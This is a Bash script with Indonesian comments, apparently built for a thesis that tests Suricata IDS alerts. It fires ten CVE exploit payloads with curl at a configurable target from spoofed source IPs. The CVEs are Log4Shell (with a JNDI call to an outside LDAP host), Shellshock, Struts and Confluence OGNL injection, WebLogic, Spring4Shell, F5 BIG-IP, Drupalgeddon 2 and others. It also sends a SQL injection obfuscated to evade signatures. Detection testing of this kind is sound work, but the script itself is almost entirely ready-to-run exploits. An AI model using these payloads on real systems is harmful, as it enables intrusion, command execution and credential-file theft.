#!/bin/bash
# ==============================================================================
# SuricataEVE - Automated CVE Attack Script
# Berisi eksploitasi CVE yang terbukti memicu alert Suricata (ET Open Rules).
# ==============================================================================

TARGET="${TARGET:-192.168.216.128}"
IFACE="${IFACE:-eth0}"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Error: Tolong jalankan script ini sebagai root (sudo ./atk.sh)${NC}"
  exit 1
fi

header() {
    echo -e "\n${BLUE}${BOLD}================================================================${NC}"
    echo -e "${CYAN}${BOLD} $1 ${NC}"
    echo -e "${BLUE}${BOLD}================================================================${NC}\n"
}

info() { echo -e "${YELLOW}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
atk() { echo -e "${RED}[!]${NC} $1"; }

setup_all_ips() {
    info "Menyiapkan 12 IP Bayangan di antarmuka ${IFACE} (101..112)..."
    for i in {101..112}; do
        ip addr add 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
    done
    success "Semua IP Bayangan siap digunakan!"
}

# ------------------------------------------------------------------------------
# 10 CVE EXPLOITS (Pasti Terdeteksi)
# ------------------------------------------------------------------------------

do_1_log4shell() {
    header "1. CVE-2021-44228 (Log4Shell) -> IP: .101"
    atk "Eksploitasi Java Log4j via JNDI injection..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.101 \
            -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' \
            "http://${TARGET}/"
    done
    success "Selesai."
}

do_2_shellshock() {
    header "2. CVE-2014-6271 (Shellshock) -> IP: .102"
    atk "Eksploitasi Bash CGI (Shellshock)..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.102 \
            -A "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
            "http://${TARGET}/cgi-bin/test.cgi"
    done
    success "Selesai."
}

do_3_apache_traversal() {
    header "3. CVE-2021-41773 (Apache HTTP Server Path Traversal) -> IP: .103"
    atk "Eksploitasi Path Traversal di Apache 2.4.49..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.103 \
            --path-as-is "http://${TARGET}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    done
    success "Selesai."
}

do_4_phpunit() {
    header "4. CVE-2017-9841 (PHPUnit RCE) -> IP: .104"
    atk "Eksploitasi RCE di PHPUnit eval-stdin.php..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.104 \
            -d '<?php system("cat /etc/passwd"); ?>' \
            "http://${TARGET}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    done
    success "Selesai."
}

do_5_struts() {
    header "5. CVE-2017-5638 (Apache Struts 2 RCE) -> IP: .105"
    atk "Eksploitasi OGNL Injection di header Content-Type..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.105 \
            -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
            "http://${TARGET}/"
    done
    success "Selesai."
}

do_6_confluence_ognl() {
    header "6. CVE-2022-26134 (Atlassian Confluence OGNL) -> IP: .106"
    atk "Eksploitasi OGNL Injection di Confluence..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.106 \
            "http://${TARGET}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
    done
    success "Selesai."
}

do_7_weblogic() {
    header "7. CVE-2020-14882 (Oracle WebLogic RCE) -> IP: .107"
    atk "Eksploitasi RCE di Oracle WebLogic..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.107 \
            "http://${TARGET}/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/pwned%27);%22);"
    done
    success "Selesai."
}

do_8_spring4shell() {
    header "8. CVE-2022-22965 (Spring4Shell) -> IP: .108"
    atk "Eksploitasi ClassLoader manipulation..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.108 \
            -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di" \
            "http://${TARGET}/"
    done
    success "Selesai."
}

do_9_f5_bigip() {
    header "9. CVE-2020-5902 (F5 BIG-IP RCE) -> IP: .109"
    atk "Eksploitasi TMUI RCE..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.109 \
            "http://${TARGET}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    done
    success "Selesai."
}

do_10_drupalgeddon() {
    header "10. CVE-2018-7600 (Drupalgeddon 2) -> IP: .110"
    atk "Eksploitasi RCE Drupal Form API..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.110 \
            -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id" \
            "http://${TARGET}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    done
    success "Selesai."
}

# ------------------------------------------------------------------------------
# 2 SKENARIO KONTROL (Penting untuk Bukti Evaluasi Skripsi)
# ------------------------------------------------------------------------------

do_11_bypass_obfuscation() {
    header "11. [FALSE NEGATIVE] SQLi Obfuscation (Lolos Signature) -> IP: .111"
    info "Mengirim payload bypass..."
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.111 \
        "http://${TARGET}/vulnerabilities/sqli/?id=1%20%2F%2A%2150000UNION%2A%2F%20%2F%2A%2150000SELECT%2A%2F%201%2Cuser%28%29&Submit=Submit"
    success "Terkirim."
}

do_12_normal_user() {
    header "12. [NORMAL TRAFFIC] Akses Pengguna Sah -> IP: .112"
    info "Mengirim traffic normal (harus dibiarkan)..."
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 "http://${TARGET}/"
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 "http://${TARGET}/login.php"
    success "Terkirim."
}

do_all() {
    setup_all_ips
    header "🚀 MEMULAI PENGUJIAN CVE EKSPLOITASI"
    
    do_1_log4shell
    do_2_shellshock
    do_3_apache_traversal
    do_4_phpunit
    do_5_struts
    do_6_confluence_ognl
    do_7_weblogic
    do_8_spring4shell
    do_9_f5_bigip
    do_10_drupalgeddon

    do_11_bypass_obfuscation
    do_12_normal_user

    header "PENGUJIAN SELESAI!"
    echo -e "Silakan jalankan: ${GREEN}python3 report.py${NC} untuk membuat laporan."
}

do_all
